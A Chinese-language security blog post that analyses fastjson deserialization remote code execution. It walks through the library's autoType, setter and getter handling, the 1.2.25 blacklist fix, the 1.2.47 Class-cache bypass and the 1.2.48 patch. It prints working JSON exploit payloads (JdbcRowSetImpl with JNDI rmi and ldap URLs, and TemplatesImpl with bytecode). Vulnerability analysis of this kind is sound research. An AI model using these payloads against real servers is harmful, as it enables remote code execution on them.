---
title: fastjson RCE 分析
date: 2020-02-01 18:18:25
tags: [java, web]
---


## 简介

先看经典 payload
```json
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://localhost:1099/Exploit","autoCommit":true}
```

<!--more-->

简单来说原因是 fastjson 支持反序列类, 并通过 setter, getter 的方式来为类设置属性, 比如 `dataSourceName` 就会调用 `setDataSourceName("rmi://localhost:1099/Exploit")`, 而有些类在 setter 之中, 可能有些副作用. 比如这个 payload 中的 `com.sun.rowset.JdbcRowSetImpl`.

```java
public void setAutoCommit(boolean autoCommit) throws SQLException {
    if (this.conn != null) {
        this.conn.setAutoCommit(autoCommit);
    } else {
        this.conn = this.connect();
        this.conn.setAutoCommit(autoCommit);
    }
}

private Connection connect() throws SQLException {
    if (this.conn != null) {
        return this.conn;
    } else if (this.getDataSourceName() != null) {
        try {
            Context ctx = new InitialContext();
            DataSource ds = (DataSource)ctx.lookup(this.getDataSourceName());
            return this.getUsername() != null && !this.getUsername().equals("") ? ds.getConnection(this.getUsername(), this.getPassword()) : ds.getConnection();
        } catch (NamingException var3) {
            throw new SQLException(this.resBundle.handleGetObject("jdbcrowsetimpl.connect").toString());
        }
    } else {
        return this.getUrl() != null ? DriverManager.getConnection(this.getUrl(), this.getUsername(), this.getPassword()) : null;
    }
}
```

在 `setAutoCommit` 的时候会 `ctx.lookup`, 之后就是 JNDI 注入了, 先不管这个, 主要还是了解 fastjson 的问题.  
除了这个 payload 还有一个基于 `TemplatesImpl` 的 payload, 
```json
{"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["yv66vgAAADQALAoACgAaCgAbABwHAB0IAB4IAB8IACAKABsAIQcAIgoACAAaBwAjAQAGPGluaXQ+AQADKClWAQAEQ29kZQExxxx"],"_name":"a.b","_tfactory":{ },"_outputProperties":{ },"_version":"1.0","allowedProtocols":"all"}
```
这个 payload 相信如果看过 ysoserial 大概都能猜出来, 不过比较不同的他的触发方法比较奇特, 不是通过 setter 来触发, 相信看完下面的内容就能理解了.

## 入口

一般用到最多的地方就是 spring 这种 framework, fastjson 提供了对应的接口

com.alibaba.fastjson.support.spring.FastJsonHttpMessageConverter
```java
@Override
protected Object readInternal(Class<? extends Object> clazz, HttpInputMessage inputMessage) throws IOException, HttpMessageNotReadableException {
    return readType(getType(clazz, null), inputMessage);
}

private Object readType(Type type, HttpInputMessage inputMessage) {
    try {
        InputStream in = inputMessage.getBody();
        return JSON.parseObject(in, fastJsonConfig.getCharset(), type, fastJsonConfig.getParserConfig(), fastJsonConfig.getParseProcess(), JSON.DEFAULT_PARSER_FEATURE, fastJsonConfig.getFeatures());
    } catch (JSONException ex) {
        throw new HttpMessageNotReadableException("JSON parse error: " + ex.getMessage(), ex);
    } catch (IOException ex) {
        throw new HttpMessageNotReadableException("I/O error while reading input message", ex);
    }
}
```

可以看到调用的就是 `JSON.parseObject`, 这是用来解析 json objcet 的, 还有个 `JSON.parse`, 这个可以用来解析 `123`, `"123"` 之类的 primitive.  

实际上 `JSON.parseObject` 有很多重载, 给 spring 写的接口与平常用的并不一样. 

```java
public static <T> T parseObject(InputStream is, Charset charset, Type type, ParserConfig config, ParseProcess processor, int featureValues, Feature... features) throws IOException {
    if (charset == null) {
        charset = IOUtils.UTF8;
    }

    byte[] bytes = allocateBytes(1024 * 64);
    int offset = 0;
    for (;;) {
        int readCount = is.read(bytes, offset, bytes.length - offset);
        if (readCount == -1) {
            break;
        }
        offset += readCount;
        if (offset == bytes.length) {
            byte[] newBytes = new byte[bytes.length * 3 / 2];
            System.arraycopy(bytes, 0, newBytes, 0, bytes.length);
            bytes = newBytes;
        }
    }

    return (T) parseObject(bytes, 0, offset, charset, type, config, processor, featureValues, features);
}
```

```java
public static JSONObject parseObject(String text) {
    Object obj = parse(text);
    if (obj instanceof JSONObject) {
        return (JSONObject) obj;
    }

    try {
        return (JSONObject) JSON.toJSON(obj);
    } catch (RuntimeException e) {
        throw new JSONException("can not cast to JSONObject.", e);
    }
}
```

平常用的在内部就是调用的 `JSON.parse`, 而且后面有个 `toJSON`, 在这其中会又序列化一遍调用 getter, 如果 getter 里面有问题, 那么也会导致漏洞. 不过一般还是用给 spring 的接口.


## autotype

autotype 就是指这个反序列化 java 类的功能, 也是漏洞的源头. 在新版本里增加了黑名单检测, 所以这里先切到旧版

```java
if (key == JSON.DEFAULT_TYPE_KEY && !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) {
                        ref = lexer.scanSymbol(this.symbolTable, '"');
                        Class<?> clazz = TypeUtils.loadClass(ref, this.config.getDefaultClassLoader());
```

比较神奇的是它这个 parser, 只要 `@type` 不是这 object 的最后一个 key, 都是能正常工作的. 如果是最后一个 key, 返回一个调用默认构造器产生对象, 没有设置各种属性.  
而如果不最后一个, 会调用 castToJavaBean 将之前解析的属性给赋值过去, 然后 deserializer.deserialze 走正常流程.

```java
if (key == JSON.DEFAULT_TYPE_KEY
        && !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) {
    String typeName = lexer.scanSymbol(symbolTable, '"');

    if (lexer.isEnabled(Feature.IgnoreAutoType)) {
        continue;
    }

    if (clazz == null) {
            map.put(JSON.DEFAULT_TYPE_KEY, typeName);
            continue;
        }

        lexer.nextToken(JSONToken.COMMA);
        if (lexer.token() == JSONToken.RBRACE) { // 最后一个 key, 当然接下来就是 } 了
            lexer.nextToken(JSONToken.COMMA);
            try {
                Object instance = null;
                ObjectDeserializer deserializer = this.config.getDeserializer(clazz);
                if (deserializer instanceof JavaBeanDeserializer) {
                    instance = TypeUtils.cast(object, clazz, this.config);
                }

                if (instance == null) {
                    if (clazz == Cloneable.class) {
                        instance = new HashMap();
                    } else if ("java.util.Collections$EmptyMap".equals(typeName)) {
                        instance = Collections.emptyMap();
                    } else if ("java.util.Collections$UnmodifiableMap".equals(typeName)) {
                        instance = Collections.unmodifiableMap(new HashMap());
                    } else {
                        instance = clazz.newInstance();
                    }
                }

                return instance;
```

不过按照设计, `@type` 肯定是放在最前面的. 这应该算 UB, 不做过多讨论.  
正常情况应该是 deserializer.deserialze. 对于普通 Bean, 创建 deserialzer 是在 `com.alibaba.fastjson.parser.ParserConfig` 的 `this.createJavaBeanDeserializer`, 取得 setter 是在 `JavaBeanInfo.build`. 判断 setter 的方法如下:

```java
 if (methodName.startsWith("set")) {
    char c3 = methodName.charAt(3);
    String propertyName;
    if (!Character.isUpperCase(c3) && c3 <= 512) {
        if (c3 == '_') {
            propertyName = methodName.substring(4);
        } else if (c3 == 'f') {
            propertyName = methodName.substring(3);
        } else {
            if (methodName.length() < 5 || !Character.isUpperCase(methodName.charAt(4))) {
                continue;
            }

            propertyName = TypeUtils.decapitalize(methodName.substring(3));
        }
    } else if (TypeUtils.compatibleWithJavaBean) {
        propertyName = TypeUtils.decapitalize(methodName.substring(3));
    } else {
        propertyName = Character.toLowerCase(methodName.charAt(3)) + methodName.substring(4);
    }
```

很明显, 适配了常见的两种命名方式, set_xxx 和 setXxx, 下划线和驼峰, 还有一个 fxxx 命名方式没见过, 可能是阿里内部用的多吧 (逃  

但是除了这种 setter, 实际上还会调用一些 getter, 先看相关代码  

com.alibaba.fastjson.util.JavaBeanInfo
```java
var30 = clazz.getMethods();
var29 = var30.length;

for(i = 0; i < var29; ++i) {
    method = var30[i];
    String methodName = method.getName();
    if (methodName.length() >= 4 && !Modifier.isStatic(method.getModifiers()) && methodName.startsWith("get") && Character.isUpperCase(methodName.charAt(3)) && method.getParameterTypes().length == 0 && (Collection.class.isAssignableFrom(method.getReturnType()) || Map.class.isAssignableFrom(method.getReturnType()) || AtomicBoolean.class == method.getReturnType() || AtomicInteger.class == method.getReturnType() || AtomicLong.class == method.getReturnType())) {
        JSONField annotation = (JSONField)method.getAnnotation(JSONField.class);
        if (annotation == null || !annotation.deserialize()) {
            String propertyName;
            if (annotation != null && annotation.name().length() > 0) {
                propertyName = annotation.name();
            } else {
                propertyName = Character.toLowerCase(methodName.charAt(3)) + methodName.substring(4);
            }
```

可以看到判断了一下开头为 get, 且第四位为大写, 重点是后面检测了返回值, 必须继承 Map, Collection 或者是 AtomicXxxx. 这些是干嘛的呢?  
可以看一下具体这些方法会被怎么调用就知道了  

com.alibaba.fastjson.parser.deserializer.FieldDeserializer
```java
public void setValue(Object object, Object value) {
    if (value != null || !this.fieldInfo.fieldClass.isPrimitive()) {
        try {
            Method method = this.fieldInfo.method;
            if (method != null) { // 优先调用 method, 下面是直接复制给 field, 与这里类似, 不复制了
                if (this.fieldInfo.getOnly) {
                    if (this.fieldInfo.fieldClass == AtomicInteger.class) {
                        AtomicInteger atomic = (AtomicInteger)method.invoke(object);
                        if (atomic != null) {
                            atomic.set(((AtomicInteger)value).get());
                        }
                    } else if (this.fieldInfo.fieldClass == AtomicLong.class) {
                        AtomicLong atomic = (AtomicLong)method.invoke(object);
                        if (atomic != null) {
                            atomic.set(((AtomicLong)value).get());
                        }
                    } else if (this.fieldInfo.fieldClass == AtomicBoolean.class) {
                        AtomicBoolean atomic = (AtomicBoolean)method.invoke(object);
                        if (atomic != null) {
                            atomic.set(((AtomicBoolean)value).get());
                        }
                    } else if (Map.class.isAssignableFrom(method.getReturnType())) {
                        Map map = (Map)method.invoke(object);
                        if (map != null) {
                            map.putAll((Map)value);
                        }
                    } else {
                        Collection collection = (Collection)method.invoke(object);
                        if (collection != null) {
                            collection.addAll((Collection)value);
                        }
                    }
                } else {
                    method.invoke(object, value);
                }
```

可以看到是调用了 getter, 然后赋值给这些对象, 相信现在就能明白这些是干嘛的了, 如果有一个对象, 里面有一个属性是 `HashMap test`, 且有一个 `public HashMap getTest()` 方法, 那么在反序列化时, `{"@type": "xxx.xxx", "test": {"aa": "sss"}}`, key => aa, value => sss 将会被加到 test 里面去, 这算一个小 feature 吧, 方便开发. 但是确实有点反直觉.  

这里顺便看一下正规反序列 (toJSON, toJSONString) 时使用的 getter 是怎么判断的, 在 `com.alibaba.fastjson.util.TypeUtils` 的 `buildBeanInfo`, 里面调用了 `computeGetters` 

```java
if(methodName.startsWith("get")){
    if(methodName.length() < 4){
        continue;
    }
    if(methodName.equals("getClass")){
        continue;
    }
    if(methodName.equals("getDeclaringClass") && clazz.isEnum()){
        continue;
    }
    char c3 = methodName.charAt(3);
    String propertyName;
    Field field = null;
    if(Character.isUpperCase(c3) //
            || c3 > 512 // for unicode method name
            ){
        if(compatibleWithJavaBean){
            propertyName = decapitalize(methodName.substring(3));
        } else{
            propertyName = Character.toLowerCase(methodName.charAt(3)) + methodName.substring(4);
        }
        propertyName = getPropertyNameByCompatibleFieldName(fieldCacheMap, methodName, propertyName, 3);
    } else if(c3 == '_'){
        propertyName = methodName.substring(4);
        field = fieldCacheMap.get(propertyName);
        if (field == null) {
            String temp = propertyName;
            propertyName = methodName.substring(3);
            field = ParserConfig.getFieldFromCache(propertyName, fieldCacheMap);
            if (field == null) {
                propertyName = temp; //减少修改代码带来的影响
            }
        }
    } else if(c3 == 'f'){
        propertyName = methodName.substring(3);
    } else if(methodName.length() >= 5 && Character.isUpperCase(methodName.charAt(4))){
        propertyName = decapitalize(methodName.substring(3));
    } else{
        propertyName = methodName.substring(3);
        field = ParserConfig.getFieldFromCache(propertyName, fieldCacheMap);
        if (field == null) {
            continue;
        }
    }
```

可以看到规则是跟取 setter 类似的, 就是方法名开头从 set 改成 get.  

总结一下有 `@type` 的反序列化大致流程  

1. parse 到 key = @type, 将 value 作为 class
2. 反射出类的构造器, 方法, 等
3. 若不是一些内置包装类或者特殊类 + 存在默认构造器, 那么调用 JavaBeanInfo.build 得到 getter, setter, 属性的信息
4. 继续扫描 json, 若有对应的 key 可以找到 setter 或者属性, 就调用 setter 或者直接赋值给属性

另外 autotype 是可以嵌套的, 比如可以

```json
[
    {
        "@type": "xxx.xxx",
        "xxx": "xxx"
    },
    {
        "@type": "xxx.xxx",
        "xxx": {
            "@type": ""
        }
    },
    {
        "@type": "xxx"
    } : "xx"
]
```

作为 array 里面的元素, object 的 value 都是可以的, 甚至可以作为 key, 会调用 `toString` 方法作为 JSONObject 的 key.  

所以看了反序列化的流程, 那么挖掘反序列化漏洞, 可以重点看  

1. 无参构造器
2. public 单参数 setter
3. 返回值类型继承 Map, Collection 或者是 AtomicXxxx 的无参 getter 方法
3. toString
4. 如果是手动调用的 parseObject, 那么 getter 的范围可以扩大

## TemplateImpl POC 分析

JdbcRowSetImpl 的 POC 比较简单, 一开始就已经分析好了. TemplateImpl 相对比较复杂, 有很多用到了 fastjson 的一些特性, 比如
```json
{"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["yv66vgAAADQALAoACgAaCgAbABwHAB0IAB4IAB8IACAKABsAIQcAIgoACAAaBwAjAQAGPGluaXQ+AQADKClWAQAEQ29kZQE...."],"_name":"a.b","_tfactory":{ },"_outputProperties":{ },"_version":"1.0","allowedProtocols":"all"}
```

其中 _bytecodes 是 private 的, 能赋值成功需要目标开启 Feature.SupportNonPublicField (默认关闭) 才能强制将值赋给 private 的属性. 所以这个 payload 说实话还是图一乐, 估计也就 CTF 用的到.  

另外可以看到 _bytecodes 是 base64 过的, 因为 json 标准里面是不能直接序列化 binary 的, fastjson 对 byte[] 在反序列时会 base64 decode 一下.  

不同与上面的 payload 的是这里触发的就不是 setter 了, 而是我们特别提到过的特殊 getter. 这里是 _outputProperties

```java
public synchronized Properties getOutputProperties() {
    try {
        return this.newTransformer().getOutputProperties();
    } catch (TransformerConfigurationException var2) {
        return null;
    }
}
```

而 Properties 继承于 Hashtable, 最后继承到 Map. 完美符合条件, 方法里面的 `newTransformer` 最后触发 defineTransletClasses, 导致实例化 bytecode, 最后 RCE.  
这里 _outputProperties 匹配到 getOutputProperties 这个 getter 的原因是匹配时会把 key 里面的 _ 给全部替换为空 (估计是为了方便前端 js 下划线命名可以不用特意替换成驼峰命名), 具体代码分析可以看看底下推荐阅读的 3 号.  
所以这里 payload 可以写成 outputProperties, 这个 _ 可有可无, 而且在扫描到 _outputProperties 就已经触发, 后面的属性也是多余的... 所以这个 payload 其实等价于
```json
{"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["yv66vgAAADQALAoACgAaCgAbABwHAB0IAB4IAB8IACAKABsAIQcAIgoACAAaBwAjAQAGPGluaXQ+AQADKClWAQAEQ29kZQE...."],"_name":"anything","_tfactory":{ },"outputProperties":{ }}
```

## 1.2.25 修复

```java
//1.2.24
Class<?> clazz = TypeUtils.loadClass(typeName, config.getDefaultClassLoader());
//1.2.25
Class<?> clazz = config.checkAutoType(typeName);
```
不再直接 Class.forName 了, 而是加上了不少限制

```java
if (typeName == null) {
        return null;
    }

    final String className = typeName.replace('$', '.');

    if (autoTypeSupport) {
        for (int i = 0; i < denyList.length; ++i) {
            String deny = denyList[i];
            if (className.startsWith(deny)) {
                throw new JSONException("autoType is not support. " + typeName);
            }
        }
    }

    Class<?> clazz = TypeUtils.getClassFromMapping(typeName);
    if (clazz == null) {
        clazz = derializers.findClass(typeName);
    }

    if (clazz != null) {
        return clazz;
    }

    for (int i = 0; i < acceptList.length; ++i) {
        String accept = acceptList[i];
        if (className.startsWith(accept)) {
            return TypeUtils.loadClass(typeName, defaultClassLoader);
        }
    }

    if (autoTypeSupport) {
        clazz = TypeUtils.loadClass(typeName, defaultClassLoader);
    }
```

首先是加了一个 Feature, 且默认关闭, 也就是说默认不支持 @type 这种反序列类的方法了. 而且就算打开了, 还有了黑名单, 直接 ban 掉了之前的那两个 payload 的类.

## 1.2.47 绕过

在这之间也出现不少绕过, 但是需要手动开始 autoType, 可以看看推荐阅读的 4 号. 而 1.2.47 版本出现的这个绕过就比较牛逼, 不开始 autoType 这个 feature 也能打.

先看 payload 
```json
{
    "a": {
        "@type": "java.lang.Class", 
        "val": "com.sun.rowset.JdbcRowSetImpl"
    }, 
    "b": {
        "@type": "com.sun.rowset.JdbcRowSetImpl", 
        "dataSourceName": "ldap://localhost:1389/Exploit", 
        "autoCommit": true
    }
}
```

先看这个 `java.lang.Class`, 需要知道一点, fastjson 有很多对内置类的提前做好的反序列化器. 可以在 `com.alibaba.fastjson.parser.ParserConfig` 的 `initDeserializers` 的方法看到. 这个方法在类构造时就会被调用, 而其中
```java
//...省略
deserializers.put(boolean.class, BooleanCodec.instance);
deserializers.put(Boolean.class, BooleanCodec.instance);
deserializers.put(Class.class, MiscCodec.instance);
deserializers.put(char[].class, new CharArrayCodec());
//...省略
```
在反序列化时会优先使用这些预定义好的反序列器, 如果不存在的话, 才会去调用 `createJavaBeanDeserializer`, 去读取目标类的 setter, getter, 属性等去反序列化.  
而对于 Class.class, 反序列化方法是
```java
Object objVal;

if (parser.resolveStatus == DefaultJSONParser.TypeNameRedirect) {
    parser.resolveStatus = DefaultJSONParser.NONE;
    parser.accept(JSONToken.COMMA);

    if (lexer.token() == JSONToken.LITERAL_STRING) {
        if (!"val".equals(lexer.stringVal())) {
            throw new JSONException("syntax error");
        }
        lexer.nextToken();
    } else {
        throw new JSONException("syntax error");
    }

    parser.accept(JSONToken.COLON);

    objVal = parser.parse();

    parser.accept(JSONToken.RBRACE);
} else {
    objVal = parser.parse();
}

String strVal;

if (objVal == null) {
    strVal = null;
} else if (objVal instanceof String) {
    strVal = (String) objVal;
} else {
// ... 省略
}
// ... 省略

if (clazz == Class.class) {
    return (T) TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader());
}
```

可以看到就是将 val 作为类名, 然后用 classloader 去 load 这个 class, 然后返回这个类的 Class 对象.  
然后回到 fastjson 
```java
if (autoTypeSupport || expectClass != null) { // <-- 默认 autoType 关闭, expectClass = null 这一段可以无视
    long hash = h3;
    for (int i = 3; i < className.length(); ++i) {
        hash ^= className.charAt(i);
        hash *= PRIME;
        if (Arrays.binarySearch(acceptHashCodes, hash) >= 0) {
            clazz = TypeUtils.loadClass(typeName, defaultClassLoader, false);
            if (clazz != null) {
                return clazz;
            }
        }
        if (Arrays.binarySearch(denyHashCodes, hash) >= 0 && TypeUtils.getClassFromMapping(typeName) == null) {
            throw new JSONException("autoType is not support. " + typeName);
        }
    }
}

if (clazz == null) {
    clazz = TypeUtils.getClassFromMapping(typeName);
}

if (clazz == null) {
    clazz = deserializers.findClass(typeName);
}

if (clazz != null) {
    if (expectClass != null
            && clazz != java.util.HashMap.class
            && !expectClass.isAssignableFrom(clazz)) {
        throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
    }

    return clazz;
}
```
重点在 `deserializers.findClass(typeName);` 

```java
public Class findClass(String keyString) {
    for (int i = 0; i < buckets.length; i++) {
        Entry bucket = buckets[i];

        if (bucket == null) {
            continue;
        }

        for (Entry<K, V> entry = bucket; entry != null; entry = entry.next) {
            Object key = bucket.key;
            if (key instanceof Class) {
                Class clazz = ((Class) key);
                String className = clazz.getName();
                if (className.equals(keyString)) {
                    return clazz;
                }
            }
        }
    }

    return null;
}
```
这个 bucket 就是 put 方法会存进去的 bucket, 所以这里因为是内置类, 其实等价于白名单, 所以直接返回了 clazz, autoType 即使关闭也是可以正常反序列化这些对象的. 比如 Integer, String, URL 等等内置常见对象的.  

而问题也是出在这里, 还记得 Class 的反序列化方式么, 会调用 `TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader())`,
```java
public static Class<?> loadClass(String className, ClassLoader classLoader) {
    return loadClass(className, classLoader, true);
}

public static Class<?> loadClass(String className, ClassLoader classLoader, boolean cache) {
    if(className == null || className.length() == 0){
        return null;
    }
    Class<?> clazz = mappings.get(className);
    if(clazz != null){
        return clazz;
    }
    if(className.charAt(0) == '['){
        Class<?> componentType = loadClass(className.substring(1), classLoader);
        return Array.newInstance(componentType, 0).getClass();
    }
    if(className.startsWith("L") && className.endsWith(";")){
        String newClassName = className.substring(1, className.length() - 1);
        return loadClass(newClassName, classLoader);
    }
    try{
        if(classLoader != null){
            clazz = classLoader.loadClass(className);
            if (cache) {
                mappings.put(className, clazz);
            }
            return clazz;
        }
    }
```

注意 `mappings.put(className, clazz)`, 如果这个类存在, 会将其放入 TypeUtils 里面的这个缓存中.  

又回到 checkAutoType 中, 注意这个

com.alibaba.fastjson.parser.ParserConfig
```java
if (clazz == null) {
    clazz = TypeUtils.getClassFromMapping(typeName);
}

if (clazz == null) {
    clazz = deserializers.findClass(typeName);
}
```

com.alibaba.fastjson.util.TypeUtils
```java
public static Class<?> getClassFromMapping(String className){
    return mappings.get(className);
}
```

除了在 deserializers 里面寻找, 还会在 TypeUtils 的缓存里面寻找, 而刚刚我们通过 Class 的反序列化方法, 将我们想要的类放入了缓存中. 这就到达了绕过的效果, 意味着就算我们关闭了 autoType, 照样可以进行利用, 漏洞的发现者 tql.  

这里的本意, 应该是加快速度, 毕竟如果你之前加载过这个类, 当然是在白名单里面的, 但是问题出现在 Class 的反序列器也会调用 loadClass, 这是开发者忘记掉的. 导致恶意类被放入了缓存中, 绕过了检测.  

## 1.2.48 修复

对应的修复
```java
public static Class<?> loadClass(String className, ClassLoader classLoader) {
    return loadClass(className, classLoader, false);
}
```
将 loadClass 的 cache 设为 false, 这样反序列 Class 对象的时候, 就不会将结果放入缓存中, 自然也就无法绕过 checkAutoType 了.

## 本文参考/推荐阅读

[1] http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/  
[2] https://kingx.me/Exploit-FastJson-Without-Reverse-Connect.html  
[3] https://kingx.me/Details-in-FastJson-RCE.html  
[4] https://www.kingkk.com/2019/07/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1-2-24-1-2-48/  
